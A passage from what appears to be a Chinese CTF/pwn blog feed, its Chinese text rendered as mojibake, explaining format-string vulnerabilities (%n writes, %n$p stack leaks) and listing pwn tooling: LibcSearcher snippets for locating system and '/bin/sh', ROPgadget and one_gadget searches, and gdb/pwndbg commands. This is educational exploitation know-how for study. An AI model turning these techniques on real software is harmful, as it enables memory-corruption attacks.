<td align="center">æ ¹æ®å‚æ•°åˆ—è¡¨æ ¼å¼åŒ–è¾“å‡ºåˆ°æŒ‡å®šFILEæµ</td>
</tr>
<tr>
<td align="center">sprintf</td>
<td align="center">è¾“å‡ºåˆ°å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">snprintf</td>
<td align="center">è¾“å‡ºæŒ‡å®šå­—èŠ‚æ•°åˆ°å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">vsprintf</td>
<td align="center">æ ¹æ®å‚æ•°åˆ—è¡¨æ ¼å¼åŒ–è¾“å‡ºåˆ°å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">vsnprintf</td>
<td align="center">æ ¹æ®å‚æ•°åˆ—è¡¨æ ¼å¼åŒ–è¾“å‡ºæŒ‡å®šå­—èŠ‚åˆ°å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">setproctitle</td>
<td align="center">è®¾ç½®argv</td>
</tr>
<tr>
<td align="center">syslog</td>
<td align="center">è¾“å‡ºæ—¥å¿—</td>
</tr>
<tr>
<td align="center">err, verr, warn, vwarnç­‰</td>
<td align="center">ã€‚ã€‚ã€‚</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<ul>
<li><p>printfå‡½æ•°çš„å­—ç¬¦ä¸²æ¼æ´</p>
<p>æ­¤æ¼æ´å¦‚ï¼ˆæ¥è‡ªæ”»é˜²ä¸–ç•Œçš„CGfsbï¼‰ï¼š</p>
<p><img src="/2020/12/05/2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/QQ%E5%9B%BE%E7%89%8720201205111442-1607139495232.png"></p>
</li>
</ul>
<p>åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ä¸­%nï¼Œä½œç”¨æ˜¯æŠŠåœ¨%nå‰è¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°èµ‹å€¼ç»™å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡</p>
<p>%hhçš„ä½œç”¨æ˜¯é™å®šè¾“å‡ºæ ¼å¼ä¸º8ä½ï¼Œå³ä¸€ä¸ªå­—èŠ‚ï¼›</p>
<p>%hçš„ä½œç”¨æ˜¯é™å®šè¾“å‡ºæ ¼å¼ä¸º16ä½ï¼Œå³ä¸¤ä¸ªå­—èŠ‚ï¼›</p>
<p>%lçš„ä½œç”¨æ˜¯é™å®šè¾“å‡ºæ ¼å¼ä¸º32ä½ï¼Œå³å››ä¸ªå­—èŠ‚ï¼›</p>
<p>%llçš„ä½œç”¨æ˜¯é™å®šè¾“å‡ºæ ¼å¼ä¸º64ä½ï¼Œå³å…«ä¸ªå­—èŠ‚ï¼›</p>
<p>%Lçš„ä½œç”¨æ˜¯è¾“å‡ºå®æ•°ï¼Œæ”¯æŒlong doubleç±»å‹ï¼›</p>
<ul>
<li><p>sprintfåŸå‹int sprintf(char *string, char *format [,argument,â€¦])</p>
<ul>
<li><p><strong>string</strong>â€“ è¿™æ˜¯æŒ‡å‘ä¸€ä¸ªå­—ç¬¦æ•°ç»„çš„æŒ‡é’ˆï¼Œè¯¥æ•°ç»„å­˜å‚¨äº† C å­—ç¬¦ä¸²ã€‚</p>
</li>
<li><p><strong>format</strong>â€“ è¿™æ˜¯å­—ç¬¦ä¸²ï¼ŒåŒ…å«äº†è¦è¢«å†™å…¥åˆ°å­—ç¬¦ä¸² str çš„æ–‡æœ¬ã€‚å®ƒå¯ä»¥åŒ…å«åµŒå…¥çš„ format æ ‡ç­¾ï¼Œformat æ ‡ç­¾å¯è¢«éšåçš„é™„åŠ å‚æ•°ä¸­æŒ‡å®šçš„å€¼æ›¿æ¢ï¼Œå¹¶æŒ‰éœ€æ±‚è¿›è¡Œæ ¼å¼åŒ–ã€‚format æ ‡ç­¾å±æ€§æ˜¯**%[flags] (width)[.precision] (length)specifier**</p>
</li>
<li><p>**[argument]â€¦**ï¼šæ ¹æ®ä¸åŒçš„ format å­—ç¬¦ä¸²ï¼Œå‡½æ•°å¯èƒ½éœ€è¦ä¸€ç³»åˆ—çš„é™„åŠ å‚æ•°ï¼Œæ¯ä¸ªå‚æ•°åŒ…å«äº†ä¸€ä¸ªè¦è¢«æ’å…¥çš„å€¼ï¼Œæ›¿æ¢äº† format å‚æ•°ä¸­æŒ‡å®šçš„æ¯ä¸ª % æ ‡ç­¾ã€‚å‚æ•°çš„ä¸ªæ•°åº”ä¸ % æ ‡ç­¾çš„ä¸ªæ•°ç›¸åŒã€‚</p>
</li>
</ul>
</li>
</ul>
<p>æŠŠæ ¼å¼åŒ–çš„æ•°æ®å†™å…¥æŸä¸ªå­—ç¬¦ä¸²ç¼“å†²åŒºã€‚å¦‚æœæˆåŠŸï¼Œåˆ™è¿”å›å†™å…¥çš„å­—ç¬¦æ€»æ•°ï¼ˆä¸åŒ…æ‹¬â€™\0â€™ï¼‰ï¼Œä¸åŒ…æ‹¬å­—ç¬¦ä¸²è¿½åŠ åœ¨å­—ç¬¦ä¸²æœ«å°¾çš„ç©ºå­—ç¬¦ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å›ä¸€ä¸ªè´Ÿæ•°ã€‚</p>
<h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><h3 id="x86ç³»ç»Ÿä¸‹ï¼š"><a href="#x86ç³»ç»Ÿä¸‹ï¼š" class="headerlink" title="x86ç³»ç»Ÿä¸‹ï¼š"></a>x86ç³»ç»Ÿä¸‹ï¼š</h3><p>ä»¥printfä¸ºä¾‹</p>
<p><img src="/2020/12/05/2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/printf-1608199588168.png"></p>
<p>å‡è®¾printfå‡½æ•°å°†ä»¥å›¾ä¸­æ–¹å¼è¿›è¡Œè¾“å‡ºã€‚é‚£ä¹ˆä½œä¸ºä¸€ä¸ªå‡½æ•°ï¼Œé¦–å…ˆå°±æ˜¯å°†å‚æ•°å…¥æ ˆï¼ŒåˆæŒ‰ç…§ä»å³åˆ°å·¦çš„æ–¹å¼ã€‚é‚£ä¹ˆå°†æŒ‰ä»¥ä¸‹çš„æƒ…å†µå…¥æ ˆï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">3.14<br>123456<br>addr of &quot;red&quot;<br>addr of format string: Color %sï¼ŒNumber %dï¼ŒFloat %4.2f<br></code></pre></td></tr></table></figure>

<p>æ‰§è¡Œprintfå‡½æ•°åï¼Œå‡½æ•°ä¼šè·å–ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚å‡½æ•°å°†ä¼šä¸€ä¸ªä¸ªçš„è¯»å–å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ï¼Œæœ‰ä»¥ä¸‹æƒ…å†µï¼š</p>
<ul>
<li>å½“å‰å­—ç¬¦ä¸æ˜¯%ï¼Œç›´æ¥è¾“å‡ºåˆ°ç›¸åº”æ ‡å‡†è¾“å‡ºã€‚</li>
<li>å½“å‰å­—ç¬¦æ˜¯%ï¼Œ ç»§ç»­è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦<ul>
<li>å¦‚æœæ²¡æœ‰å­—ç¬¦ï¼ŒæŠ¥é”™</li>
<li>å¦‚æœä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯%,è¾“å‡º%ï¼›å¦åˆ™æ ¹æ®ç›¸åº”å­—ç¬¦å¯¹åº”çš„æ•°æ®ç±»å‹ï¼Œè·å–ç›¸åº”çš„å‚æ•°ï¼Œå°†å…¶è¾“å‡º</li>
</ul>
</li>
</ul>
<p>é‚£ä¹ˆæ¼æ´å°†ä¼šå‘ç”Ÿåœ¨å“ªå‘¢ï¼Ÿ</p>
<p>å‡è®¾æˆ‘ä»¬å°†ç¨‹åºå†™æˆè¿™æ ·</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¹¶æ²¡æœ‰æä¾›printfå‡½æ•°ä¸­%åå¯¹åº”çš„å‚æ•°ï¼Œæ­¤æ—¶ç¨‹åºå¹¶ä¸ä¼šæŠ¥é”™åœæ­¢ï¼Œè€Œæ˜¯ç»§ç»­æ‰§è¡Œï¼Œä¼šåœ¨æ ˆä¸­å­˜å‚¨ç€æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ°å€ä¸Šé¢çš„ä¸‰ä¸ªé«˜åœ°å€å˜é‡è§£æï¼Œä½œä¸ºè¾“å‡ºï¼š</p>
<ul>
<li><p>%såˆ™è§£æå…¶åœ°å€å¯¹åº”çš„å­—ç¬¦ä¸²</p>
</li>
<li><p>%dè§£æå†…å®¹å¯¹åº”çš„æ•´å‹å€¼</p>
</li>
<li><p>%fè§£æå†…å®¹å¯¹åº”çš„æµ®ç‚¹å€¼</p>
<p>ç¬¬ä¸€ä¸ªï¼Œæ³¨æ„ï¼è§£æåœ°å€ï¼å¦‚æœæ˜¯ä¸€ä¸ªæ— æ³•è®¿é—®çš„åœ°å€æ¯”å¦‚0ï¼Œé‚£ä¹ˆç¨‹åºå°†å´©æºƒï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬åˆ©ç”¨çš„ç‚¹ï¼Œæ¯”å¦‚æ³¨å…¥ä¸é™é‡ä¸ª%sï¼Œæ€»æœ‰ä¸€ä¸ªèƒ½è®©ç¨‹åºå´©æºƒçš„ã€‚è€Œå…¶ä½™ä¸¤ä¸ªæˆ‘ä»¬ä¹Ÿå¯ä»¥å€Ÿæ­¤è€Œä½¿å¾—æ ˆä¸Šçš„å†…å®¹æ³„éœ²å‡ºæ¥</p>
<p>è¿™é‡Œè¡¥å……ä¸€ç‚¹ï¼šæˆ‘ä»¬æ˜¯å¯ä»¥è·å–æ ˆä¸­è¢«è§†ä¸ºç¬¬n+1ä¸ªå‚æ•°çš„å€¼æ–¹æ³•ä¸ºï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">%n$p<br></code></pre></td></tr></table></figure>

<p>nä»£è¡¨è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²å¯¹åº”çš„ç¬¬nä¸ªè¾“å‡ºå‚æ•°ï¼Œé‚£ç›¸å¯¹äºè¾“å‡ºå‡½æ•°æ¥è¯´ï¼Œå°±æ˜¯ç¬¬n+1ä¸ªå‚æ•°äº†ã€‚</p>
<h3 id="x64ç³»ç»Ÿä¸‹ï¼š"><a href="#x64ç³»ç»Ÿä¸‹ï¼š" class="headerlink" title="x64ç³»ç»Ÿä¸‹ï¼š"></a>x64ç³»ç»Ÿä¸‹ï¼š</h3><p>åŸç†ä¸x86å¹¶æ— ä¸åŒï¼Œå”¯ä¸€éœ€è¦æ³¨æ„çš„å°±æ˜¯x64ç³»ç»Ÿä¸‹ï¼Œå‡½æ•°çš„å‰å…­ä½å‚æ•°æ˜¯ä½¿ç”¨å¯„å­˜å™¨å­˜æ”¾çš„ï¼Œé¡ºåºä¸ºRDI,RSI,RDX,RCX,R8,R9å¯¹åº”å‰å…­ä½å‚æ•°ï¼Œæ‰€ä»¥åœ¨gdbä¸­ç›¸å¯¹åç§»æ—¶ï¼Œè¦æŠŠæ ˆä¸Šçš„åç§»åŠ ä¸Šç›¸å·®å¯„å­˜å™¨çš„æ•°é‡çš„æ‰æ˜¯nçš„å€¼</p>
</li>
</ul>
<p>å‚è€ƒï¼š</p>
<p>ctf-wikiæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p>
]]></content>
  </entry>
  <entry>
    <title>pwnå·¥å…·çš„å®‰è£…åŠä½¿ç”¨æŒ‡ä»¤</title>
    <url>/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h2><p>1ã€å®‰è£…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs linux">git clone https://github.com/lieanu/LibcSearcher.git<br>cd LibcSearcher<br>python setup.py develop<br></code></pre></td></tr></table></figure>

<p>2ã€é”™è¯¯ï¼š</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/2020101521162965.png"></p>
<p>å¤„ç†åŠæ³•ï¼š</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/20201015211718534.png"></p>
<p>3ã€å¸¸è§ç”¨æ³•ï¼ˆè„šæœ¬ä¸­ä½¿ç”¨ï¼‰</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addrï¼ˆæŒ‡çš„æ˜¯gotè¡¨åœ°å€ï¼‰)<br>libc_base=puts_addr-libc.<span class="hljs-keyword">dump</span>(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr=libc_base+libc.<span class="hljs-keyword">dump</span>(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr=libc_base+libc.<span class="hljs-keyword">dump</span>(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>ä»¥ä¸Šå†…å®¹è½¬è½½<a href="https://blog.csdn.net/yongbaoii/article/details/109105721">LibcSearcher å®‰è£… é”™è¯¯å¤„ç† ä¸ä½¿ç”¨</a></p>
<h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><p>ä¸€èˆ¬ç”¨åœ¨64ä½ä¸‹ï¼Œå› ä¸º64ä½çš„å‡½æ•°ä¼ å‚ä¸32ä½æœ‰äº›ä¸åŒï¼Œéœ€ä½¿ç”¨åˆ°å¯„å­˜å™¨ä¼ å‚ï¼Œå¸¸ç”¨å‘½ä»¤æ ¼å¼ï¼š</p>
<figure class="highlight dsconfig"><table><tr><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> æ–‡ä»¶å <span class="hljs-built_in">--only</span> <span class="hljs-string">&#x27;pop|ret&#x27;</span>  æˆ–è€… <span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> æ–‡ä»¶å <span class="hljs-built_in">--only</span> <span class="hljs-string">&#x27;pop|ret&#x27;</span>| <span class="hljs-string">grep</span> <span class="hljs-string">&#x27;eax&#x27;</span> <br><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> æ–‡ä»¶å <span class="hljs-built_in">--only</span> <span class="hljs-string">&#x27;leave|ret&#x27;</span><br><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> æ–‡ä»¶å <span class="hljs-built_in">--only</span> <span class="hljs-string">&#x27;call|rax&#x27;</span><br><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> æ–‡ä»¶å <span class="hljs-built_in">--string</span> <span class="hljs-string">&#x27;sh&#x27;</span>ï¼ˆæœ‰çš„æ—¶å€™æ˜¯æ‰¾<span class="hljs-string">sh</span>ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æˆä¸ºå‚æ•°ï¼‰<br><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> æ–‡ä»¶å <span class="hljs-built_in">--string</span> <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> æ–‡ä»¶å <span class="hljs-built_in">--only</span> <span class="hljs-string">&#x27;int&#x27;</span>  ï¼ˆå¯»æ‰¾<span class="hljs-string">int</span> <span class="hljs-string">80H</span>ç³»ç»Ÿä¸­æ–­æŒ‡ä»¤ï¼‰<br></code></pre></td></tr></table></figure>

<p>æ–‡ä»¶ä¹Ÿå¯ä»¥æ˜¯libc</p>
<p>é™„ï¼š</p>
<p>æ­é…ä½¿ç”¨one_gadget</p>
<p>å®‰è£…ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs linux">sudo apt -y install ruby<br>sudo gem install one_gadget<br></code></pre></td></tr></table></figure>

<p>one_gadgetæ˜¯ç”¨æ¥å»æŸ¥æ‰¾åŠ¨æ€é“¾æ¥åº“é‡Œexecve(â€œ/bin/shâ€, rsp+0x70, environ)å‡½æ•°çš„åœ°å€çš„</p>
<p>ä½¿ç”¨æ–¹æ³•ï¼š</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/2020101517362410.png"></p>
<p>æ¥æºï¼š <a href="https://blog.csdn.net/yongbaoii/article/details/109101822">https://blog.csdn.net/yongbaoii/article/details/109101822</a> </p>
<h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>å…ˆè£…ï¼Œå› ä¸ºè¿™ä¸ªå¸¦æœ‰parseheapã€ä»¥åŠheapinfoç­‰æŒ‡ä»¤ï¼Œæœ‰çš„åœºæ™¯ä¸‹æ›´å¥½ç”¨</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">cd ~/<br>git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/scwuaptx/</span>Pwngdb.git <br>cp ~<span class="hljs-regexp">/Pwngdb/</span>.gdbinit ~/<br></code></pre></td></tr></table></figure>

<p>æ›´æ¢gdbæŒ‡ä»¤ï¼Œåœ¨gefã€pwndbgã€pedaä¸­é€‰æ‹©ï¼Œé€‰å“ªä¸ªå°±æŠŠå…¶ä»–éƒ½æ³¨é‡Šæ‰</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">sudo vim ~<span class="hljs-string">/.gdbinit</span><br></code></pre></td></tr></table></figure>

<h3 id="1-ç”¨é€”"><a href="#1-ç”¨é€”" class="headerlink" title="1. ç”¨é€”"></a>1. ç”¨é€”</h3><p>å¯åŠ¨ä½ çš„ç¨‹åºï¼Œå¯ä»¥æŒ‰ç…§ä½ çš„è‡ªå®šä¹‰çš„è¦æ±‚éšå¿ƒæ‰€æ¬²çš„è¿è¡Œç¨‹åº</p>
<p>å¯è®©è¢«è°ƒè¯•çš„ç¨‹åºåœ¨ä½ æ‰€æŒ‡å®šçš„è°ƒç½®çš„æ–­ç‚¹å¤„åœä½ã€‚ï¼ˆæ–­ç‚¹å¯ä»¥æ˜¯æ¡ä»¶è¡¨è¾¾å¼ï¼‰</p>
<p>å½“ç¨‹åºè¢«åœä½æ—¶ï¼Œå¯ä»¥æ£€æŸ¥æ­¤æ—¶ä½ çš„ç¨‹åºä¸­æ‰€å‘ç”Ÿçš„äº‹ã€‚</p>
<p>åŠ¨æ€çš„æ”¹å˜ä½ ç¨‹åºçš„æ‰§è¡Œç¯å¢ƒ</p>
<p>ä½¿ç”¨å‰è¦ï¼š</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata">gcc -<span class="hljs-keyword">g</span> <span class="hljs-keyword">test</span>.c -o <span class="hljs-keyword">test</span><br><span class="hljs-comment">//gccä¸­-gé€‰é¡¹æ˜¯ä¸ºäº†è·å¾—æœ‰å…³è°ƒè¯•ä¿¡æ¯ï¼Œè¦ç”¨gdbè¿›è¡Œè°ƒè¯•ï¼Œå¿…é¡»ä½¿ç”¨-gç”ŸæˆäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶</span><br></code></pre></td></tr></table></figure>

<h3 id="2-å¸¸ç”¨æŒ‡ä»¤ï¼š"><a href="#2-å¸¸ç”¨æŒ‡ä»¤ï¼š" class="headerlink" title="2. å¸¸ç”¨æŒ‡ä»¤ï¼š"></a>2. å¸¸ç”¨æŒ‡ä»¤ï¼š</h3><ul>
<li><p>checksec æŸ¥çœ‹elfç¼–è¯‘çš„ä¿æŠ¤é€‰é¡¹</p>
</li>
<li><p>aslr æŸ¥çœ‹gdbçš„aslrè®¾ç½® aslr on å¯å¼€å¯alsrè®¾ç½®</p>
</li>
<li><p>file æ–‡ä»¶å åŠ è½½objfile </p>
</li>
<li><p>disas addr å¯¹åœ°å€addrå¤„çš„æŒ‡ä»¤è¿›è¡Œåæ±‡ç¼–ï¼Œaddrå¯ä»¥æ˜¯å‡½æ•°åï¼ˆä½†æ˜¯ä¸åŠ * ä½¿ç”¨å‡½æ•°åå°±æ— æ³•ç”¨äºå‚æ•°ç¡®è®¤ï¼›ä¸åŠ *ï¼Œæ–­ç‚¹å°±ä¸ä¼šè®¾ç½®åˆ°æ±‡ç¼–è¯­è¨€å±‚çº§çš„å‡½æ•°å¼€å¤´ï¼‰</p>
</li>
<li><p>b *addr åœ¨addrå¤„ä¸‹ä¸€ä¸ªæ–­ç‚¹   båè·Ÿå‡½æ•°åå°±ä¸ç”¨ *</p>
</li>
<li><p>enable æ¿€æ´»æ–­ç‚¹</p>
</li>
<li><p>disable ç¦ç”¨æ–­ç‚¹</p>
</li>
<li><p>info b æŸ¥çœ‹æ–­ç‚¹</p>
</li>
<li><p>del num åˆ é™¤æ–­ç‚¹</p>
</li>
<li><p>x addr æŸ¥çœ‹addrå¤„å­˜å‚¨çš„æ•°æ®å€¼ </p>
</li>
<li><p>x/wx $esp ã€€ã€€ä»¥4å­—èŠ‚16è¿›åˆ¶æ˜¾ç¤ºæ ˆä¸­å†…å®¹</p>
</li>
<li><p>stack 100ã€€ã€€ æ’ä»¶æä¾›ï¼Œæ˜¾ç¤ºæ ˆä¸­100é¡¹</p>
</li>
<li><p>find xxxã€€ã€€ å¿«é€ŸæŸ¥æ‰¾ï¼Œå¾ˆå®ç”¨</p>
</li>
<li><p>r è¿è¡Œè¢«è°ƒè¯•çš„ç¨‹åº </p>
</li>
<li><p>c ç»§ç»­è¿è¡Œ </p>
</li>
<li><p>ni å•æ­¥æ‰§è¡Œä¸è¿›å…¥å‡½æ•°è°ƒç”¨</p>
</li>
<li><p>si å•æ­¥æ‰§è¡Œå¹¶è¿›å…¥å‡½æ•°è°ƒç”¨</p>
</li>
<li><p>elfsymbol â€“ è·å–non-debugging symbolä¿¡æ¯ï¼ˆpltè¡¨ï¼‰</p>
</li>
<li><p>parseheap å¯ä»¥å¯¹heapè¿›è¡Œåˆ†æï¼Œå¾—åˆ°ç›¸å…³ä¿¡æ¯</p>
</li>
<li><p>dumprop â€“åœ¨ç»™å®šå†…å­˜èŒƒå›´ä¸­Dumpå‡ºæ‰€æœ‰ROP gadgets </p>
</li>
<li><p>vmmap å¾—åˆ°è™šæ‹Ÿæ˜ å°„åœ°å€ï¼ŒåŒæ—¶å¯æŸ¥çœ‹æ‰§è¡Œæƒé™</p>
</li>
<li><p>heapinfo æŸ¥çœ‹biné“¾ä¿¡æ¯</p>
</li>
<li><p>heapbase æŸ¥çœ‹å †åœ°å€</p>
</li>
<li><p>finish æ‰§è¡Œåˆ°å‡½æ•°è¿”å›</p>
</li>
<li><p>arena æŸ¥çœ‹mainarena</p>
</li>
<li><p>telescope åœ°å€    å¯ä»¥æŸ¥çœ‹ä¸€å°æ®µè¯¥åœ°å€çš„å†…å®¹</p>
</li>
<li><p>dumpargsâ€“ å‡½æ•°å°†è¦è¢«è°ƒç”¨æ—¶ï¼Œæ˜¾ç¤ºå°†è¦è¢«ä¼ å…¥å‡½æ•°çš„æ‰€æœ‰å‚æ•°</p>
</li>
<li><p>readelf â€“ è·å–elfå¤´ä¿¡æ¯ </p>
</li>
<li><p>x/&lt;n/f/u&gt;å…¶ä¸­nã€fã€uæ˜¯å¯é€‰çš„å‚æ•°</p>
<p>x/s åœ°å€ã€€ã€€æŸ¥çœ‹å­—ç¬¦ä¸²</p>
<p>x/wx åœ°å€ã€€ã€€æŸ¥çœ‹DWORD</p>
<p>x/c åœ°å€ã€€ã€€å•å­—èŠ‚æŸ¥çœ‹</p>
<p>x/16x $esp+0x12 æŸ¥çœ‹å¯„å­˜å™¨åç§»ï¼ˆ16ä»£è¡¨æŸ¥çœ‹16ä¸ªï¼‰</p>
<p>set args å¯æŒ‡å®šè¿è¡Œæ—¶å‚æ•°ã€‚ï¼ˆå¦‚ï¼šset args 10 20 30 40 50ï¼‰</p>
<p>show args å‘½ä»¤å¯ä»¥æŸ¥çœ‹è®¾ç½®å¥½çš„è¿è¡Œå‚æ•°ã€‚</p>
</li>
</ul>
<p>s æŒ‰å­—ç¬¦ä¸²è¾“å‡º</p>
<p>x æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</p>
<p>d æŒ‰åè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</p>
<p>u æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºæ— ç¬¦å·æ•´å‹ã€‚</p>
<p>o æŒ‰å…«è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</p>
<p>t æŒ‰äºŒè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</p>
<p>a æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</p>
<p>c æŒ‰å­—ç¬¦æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</p>
<p>f æŒ‰æµ®ç‚¹æ•°æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</p>
<h3 id="åŸºæœ¬"><a href="#åŸºæœ¬" class="headerlink" title="åŸºæœ¬"></a>åŸºæœ¬</h3><ul>
<li><p>s stepï¼Œsiæ­¥å…¥</p>
</li>
<li><p>n æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ ä¸€èˆ¬è£…äº†pwndbgä¹‹åä¸‹ä¸€è¡ŒæŒ‡çš„æ˜¯ä¸‹ä¸€æ¡æ±‡ç¼–ï¼Œä½†æ˜¯å¦‚æœè°ƒè¯•çš„ç¨‹åºæ˜¯å¸¦è°ƒè¯•ä¿¡æ¯çš„ï¼Œä¸€èˆ¬ä¼šè·³å‡ è¡Œæ±‡ç¼–ï¼Œniæ­¥å…¥ï¼Œè¿™ä¸ªå°±æ˜¯çœŸæ­£çš„ä¸‹ä¸€æ¡æ±‡ç¼–æŒ‡ä»¤</p>
</li>
<li><p>b åœ¨æŸå¤„ä¸‹æ–­ç‚¹ï¼Œå¯ä»¥ç”¨</p>
</li>
<li><ul>
<li>b * adrress</li>
<li>b function_name</li>
<li>info b æŸ¥çœ‹æ–­ç‚¹ä¿¡æ¯</li>
<li>delete 1 åˆ é™¤ç¬¬ä¸€ä¸ªæ–­ç‚¹</li>
</ul>
</li>
<li><p>c ç»§ç»­</p>
</li>
<li><p>r æ‰§è¡Œ</p>
</li>
<li><p><strong>disas addr æŸ¥çœ‹addrå¤„å‰åçš„åæ±‡ç¼–ä»£ç </strong></p>
</li>
<li><p>readelf æ–‡ä»¶ä¿¡æ¯</p>
</li>
</ul>
<p>ä¸€èˆ¬c,n,niåé¢éƒ½å¯ä»¥è·Ÿæ•°å­—ï¼Œ</p>
<p>ni 10</p>
<p>å°±ä»£è¡¨ä¸‹10è¡ŒæŒ‡ä»¤</p>
<p>###æ˜¾ç¤ºæ•°æ®</p>
<h4 id="p"><a href="#p" class="headerlink" title="p"></a>p</h4><ul>
<li>p function æ˜¾ç¤ºæŸä¸ªå‡½æ•°åœ°å€</li>
<li>p $esp æŸä¸ªå¯„å­˜å™¨çš„å€¼</li>
<li><strong>p 0xdd-0x55 å¯ä»¥å½“è®¡ç®—å™¨ï¼ˆå¸¸ç”¨ï¼Œä¸ç”¨å¦å¤–å¼€pythonäº†ï¼‰</strong></li>
<li><strong>p &amp;VarName æŸ¥çœ‹å˜é‡åœ°å€ï¼ˆè²Œä¼¼è›®æœ‰ç”¨çš„ï¼‰</strong></li>
<li>p * 0xffffebac æŸ¥çœ‹æŸä¸ªåœ°å€å¤„çš„å€¼</li>
</ul>
<h4 id="x"><a href="#x" class="headerlink" title="x"></a>x</h4><ul>
<li>x/10wx addr æ˜¾ç¤ºæŸä¸ªåœ°å€å¤„å¼€å§‹çš„16è¿›åˆ¶å†…å®¹ï¼Œå¦‚æœæœ‰ç¬¦å·è¡¨ä¼šåŠ è½½ç¬¦å·è¡¨</li>
<li>x/40gx addr è·Ÿä¸Šé¢ä¸€æ ·ï¼Œä¸€èˆ¬ä¸Šé¢32ä½ç”¨ï¼Œè¿™ä¸ª64ä½</li>
<li>x/10s addr æŸ¥çœ‹addrå¼€å§‹çš„10ä¸ªå­—ç¬¦ä¸²</li>
<li>x/x $esp æŸ¥çœ‹espå¯„å­˜å™¨ä¸­çš„å€¼</li>
